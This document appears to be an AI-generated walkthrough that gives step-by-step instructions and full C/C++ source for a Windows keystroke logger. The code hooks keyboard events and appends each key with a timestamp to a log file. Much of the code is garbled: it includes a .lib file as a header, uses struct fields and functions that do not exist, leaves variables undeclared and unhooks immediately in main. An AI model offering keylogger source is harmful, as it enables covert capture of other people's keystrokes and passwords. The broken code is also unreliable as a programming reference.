To create a keystroke logger for Windows, we can use the Windows API's keyboard hooking technique. Here's a structured approach to achieve this:

### Step-by-Step Guide to Implementing a Keystroke Logger

1. **Include Necessary Headers and Libraries:**
   - Include the Windows header file for API functions and `User32.lib` for keyboard hooking.
   ```c
   #include <windows.h>
   #include <User32.lib>
   #include <iostream>
   #include <fstream>
   #include <ctime>
   #include <vector>
   ```

2. **Define Callback Function:**
   - Create a function `KeyPressCallback` to handle keyboard events.
   ```c
   void KeyPressCallback(int hinst, int thread, LPARAM lParam);
   ```

3. **Set Up the Keyboard Hook:**
   - Use `SetWindowsHook` to install the hook. Specify `WH_KEYBOARD` for keyboard events.
   ```c
   static HHOOK hook = 0;
   hook = SetWindowsHook(WH_KEYBOARD, KeyPressCallback);
   ```

4. **Define Functions for Hook Management:**
   - `InstallKeyboardHook` to set up the hook.
   ```c
   void InstallKeyboardHook();
   ```
   - `UninstallKeyboardHook` to remove the hook.
   ```c
   void UninstallKeyboardHook();
   ```

5. **Implement the Callback Function:**
   - Inside `KeyPressCallback`, determine if the event is a key press or release.
   ```c
   void KeyPressCallback(int hinst, int thread, LPARAM lParam) {
       KBDLLHOOKSTRUCT *pKb = (KBDLLHOOKSTRUCT *)lParam;
       if (pKb->make == 0) { // Key down event
           // Record key press
           // Check modifiers using GetKeyState
           // Record to log file
       } else if (pKb->make == 0x0) { // Key up event
           // Stop tracking if necessary
       }
   }
   ```

6. **Implement File Logging:**
   - Use `std::ofstream` to write logs to a file.
   ```c
   void RecordKeyPress(const char &key, bool &isShift, std::ofstream &logFile) {
       logFile << "[" << std::endl;
       logFile << "Time: " << std::ctime(&now) << std::endl;
       logFile << "Key: " << key << std::endl;
       logFile << "Shift: " << isShift << std::endl;
       logFile << "]" << std::endl;
   }
   ```

7. **Modify Key Press Handling:**
   - Use `GetKeyState` to check if shift or other modifiers are pressed.
   ```c
   bool isShift = (key == VK_LSHIFT || key == VK_RSHIFT) ? true : false;
   RecordKeyPress(key, isShift, logFile);
   ```

8. **Handle Key Releases:**
   - When a key is released, reset the tracking or stop logging.
   ```c
   if (pKb->wVkey == 0) {
       // Key released
       // Stop tracking or log release
   }
   ```

9. **Unhook on Program Termination:**
   - Ensure the hook is uninstalled when the program exits.
   ```c
   // In main function
   InstallKeyboardHook();
   std::cout << "Keyboard hook installed." << std::endl;
   // ... (other code)
   UninstallKeyboardHook();
   ```

10. **Complete Code:**
    - Combine all parts into a single .cpp file and compile.
    ```c
    #include <windows.h>
    #include <User32.lib>
    #include <iostream>
    #include <fstream>
    #include <ctime>
    #include <vector>

    void KeyPressCallback(int hinst, int thread, LPARAM lParam);
    void InstallKeyboardHook();
    void UninstallKeyboardHook();

    #define KEYBOARD_HK 0x00020908

    void KeyPressCallback(int hinst, int thread, LPARAM lParam) {
        KBDLLHOOKSTRUCT *pKb = (KBDLLHOOKSTRUCT *)lParam;
        if (pKb->make == 0) {
            // Key down event
            char key = GetAsyncKeyState(pKb->wvkey, &pKb->wkey);
            if (key != 0) {
                bool isShift = (pKb->wvkey == VK_LSHIFT || pKb->wvkey == VK_RSHIFT);
                std::ofstream logFile("keyboard_log.txt", std::ios::app);
                RecordKeyPress(key, isShift, logFile);
            }
        } else if (pKb->make == 0x0) {
            // Key up event
            // Optionally stop tracking
        }
    }

    void RecordKeyPress(const char &key, bool &isShift, std::ofstream &logFile) {
        logFile << "[" << std::endl;
        time_t now;
        time(&now);
        logFile << "Time: " << ctime(&now) << std::endl;
        logFile << "Key: " << key << std::endl;
        logFile << "Shift: " << isShift << std::endl;
        logFile << "]" << std::endl;
    }

    void InstallKeyboardHook() {
        hook = SetWindowsHook(WH_KEYBOARD, KeyPressCallback);
        if (hook == 0) {
            std::cerr << "Failed to install keyboard hook." << std::endl;
        }
    }

    void UninstallKeyboardHook() {
        if (hook != 0) {
            hook = UnhookKeyboard(hook);
            std::cout << "Keyboard hook uninstalled." << std::endl;
        }
    }

    int main() {
        InstallKeyboardHook();
        std::cout << "Press any key to continue..." << std::endl;
        while (true) {
            std::cout << std::flush;
            UninstallKeyboardHook();
            return 0;
        }
    }
   ```

